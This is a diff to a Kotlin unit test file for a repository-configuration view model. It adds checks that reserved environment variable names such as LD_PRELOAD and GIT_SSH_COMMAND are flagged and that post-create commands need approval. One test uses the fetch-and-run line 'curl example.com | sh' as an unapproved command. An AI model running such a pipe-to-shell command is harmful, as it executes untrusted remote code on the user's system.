@@ -2,6 +2,7 @@ package app.luxion.shogunai.ui.projectconfig
 
 import app.luxion.shogunai.domain.FakeProjectRepository
 import app.luxion.shogunai.domain.FakeRepositoryProvisioningSource
+import app.luxion.shogunai.domain.FakeRepositoryTrust
 import app.luxion.shogunai.domain.model.EnvironmentDeclaration
 import app.luxion.shogunai.domain.model.GradleProvider
 import app.luxion.shogunai.domain.model.Project
@@ -586,5 +587,68 @@ class ProjectConfigViewModelTest {
         val edit = provisioningSource.writtenEdits.single().second
         assertEquals(listOf("/local.properties"), edit.addCopyPatterns)
         assertTrue(provisioningSource.addedPatterns.isEmpty())
+    }
+
+    @Test
+    fun `flags reserved variable names`() {
+        val viewModel = viewModelFor(projectWith())
+        viewModel.addEnvironmentRow()
+        val row = viewModel.repositoryDraft.environment.single().id
+
+        listOf("PATH", "LD_PRELOAD", "GIT_SSH_COMMAND").forEach { name ->
+            viewModel.updateEnvironmentRow(row, name = name, template = "x")
+            assertEquals(RepositoryConfigIssue.ReservedVariableName, viewModel.repositoryDraft.issueFor(RepositoryConfigField.EnvironmentName(row)), name)
+        }
+        viewModel.updateEnvironmentRow(row, name = "PORT", template = "x")
+        assertNull(viewModel.repositoryDraft.issueFor(RepositoryConfigField.EnvironmentName(row)))
+    }
+
+    private val installCommands = listOf(listOf("npm", "install"))
+
+    private fun declare(commands: List<List<String>>) {
+        provisioningSource = FakeRepositoryProvisioningSource(
+            byRepository = mapOf(basePath to RepositoryProvisioning(postCreateCommands = commands)),
+        )
+    }
+
+    private fun viewModelWithCommands(trust: FakeRepositoryTrust): ProjectConfigViewModel {
+        declare(installCommands)
+        return ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)
+    }
+
+    @Test
+    fun `shows the declared commands as not approved until they are approved`() {
+        val trust = FakeRepositoryTrust()
+        val viewModel = viewModelWithCommands(trust)
+
+        assertEquals(installCommands, viewModel.postCreateCommands)
+        assertFalse(viewModel.postCreateApproved)
+
+        viewModel.approvePostCreateCommands()
+
+        assertTrue(viewModel.postCreateApproved)
+        assertTrue(trust.isApproved("/home/dev/projects/main-repo", installCommands))
+    }
+
+    @Test
+    fun `revoking removes the approval`() {
+        val trust = FakeRepositoryTrust(mapOf("/home/dev/projects/main-repo" to installCommands))
+        val viewModel = viewModelWithCommands(trust)
+        assertTrue(viewModel.postCreateApproved)
+
+        viewModel.revokePostCreateApproval()
+
+        assertFalse(viewModel.postCreateApproved)
+        assertFalse(trust.isApproved("/home/dev/projects/main-repo", installCommands))
+    }
+
+    @Test
+    fun `commands changed on disk show as not approved`() {
+        val trust = FakeRepositoryTrust(mapOf("/home/dev/projects/main-repo" to installCommands))
+        declare(installCommands + listOf(listOf("sh", "-c", "curl example.com | sh")))
+
+        val viewModel = ProjectConfigViewModel(projectRepository, provisioningSource, projectWith(), trust = trust)
+
+        assertFalse(viewModel.postCreateApproved)
     }
 }
